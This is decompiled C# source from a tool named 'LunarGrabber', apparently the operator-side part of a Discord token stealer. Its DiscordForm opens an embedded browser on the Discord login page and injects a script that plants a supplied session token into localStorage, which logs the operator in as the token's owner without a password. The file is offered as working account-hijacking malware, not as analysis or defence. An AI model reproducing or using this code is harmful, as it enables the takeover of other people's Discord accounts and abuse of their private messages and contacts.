using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Windows.Forms;
using Microsoft.Web.WebView2.Core;
using Microsoft.Web.WebView2.WinForms;

namespace LunarGrabber
{
	// Token: 0x02000004 RID: 4
	public partial class DiscordForm : Form
	{
		// Token: 0x17000007 RID: 7
		// (get) Token: 0x0600000C RID: 12 RVA: 0x00002123 File Offset: 0x00000323
		// (set) Token: 0x0600000D RID: 13 RVA: 0x0000212B File Offset: 0x0000032B
		private string token { get; set; }

		// Token: 0x0600000E RID: 14 RVA: 0x00002134 File Offset: 0x00000334
		public DiscordForm(string token)
		{
			this.InitializeComponent();
			this.token = token;
		}

		// Token: 0x0600000F RID: 15 RVA: 0x00002149 File Offset: 0x00000349
		private void WebView2_CoreWebView2InitializationCompleted(object sender, CoreWebView2InitializationCompletedEventArgs e)
		{
			this.webView2.CoreWebView2.Navigate("https://discord.com/login");
		}

		// Token: 0x06000010 RID: 16 RVA: 0x00002160 File Offset: 0x00000360
		private void WebView2_NavigationCompleted(object sender, CoreWebView2NavigationCompletedEventArgs e)
		{
			if (this.navigationCount == 0)
			{
				this.webView2.CoreWebView2.ExecuteScriptAsync("\r\n                setInterval(() => \r\n                {\r\n                    document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `\"" + this.token + "\"`\r\n                }, 50);\r\n                setTimeout(() => \r\n                {\r\n                    location.reload();\r\n                }, 2500);");
			}
			this.navigationCount++;
		}

		// Token: 0x06000011 RID: 17 RVA: 0x000021A0 File Offset: 0x000003A0
		private void DiscordForm_Load(object sender, EventArgs e)
		{
			try
			{
				CoreWebView2Environment.GetAvailableBrowserVersionString(null);
				this.webView2.NavigationCompleted += this.WebView2_NavigationCompleted;
				this.webView2.EnsureCoreWebView2Async(null);
				this.webView2.CoreWebView2InitializationCompleted += this.WebView2_CoreWebView2InitializationCompleted;
			}
			catch
			{
				DialogResult dialogResult = MessageBox.Show("You don't have EdgeWebView installed! Do you want to download it?", OnProgramStart.Name, MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation);
				if (dialogResult != DialogResult.Yes)
				{
					if (dialogResult == DialogResult.No)
					{
						base.Close();
					}
				}
				else
				{
					new WebClient().DownloadFile("https://go.microsoft.com/fwlink/p/?LinkId=2124703", Path.Combine(Path.GetTempPath(), "MicrosoftEdgeWebview2Setup.exe"));
					Process.Start(Path.Combine(Path.GetTempPath(), "MicrosoftEdgeWebview2Setup.exe"));
					Environment.Exit(1);
				}
			}
		}

		// Token: 0x04000005 RID: 5
		private int navigationCount;
	}
}
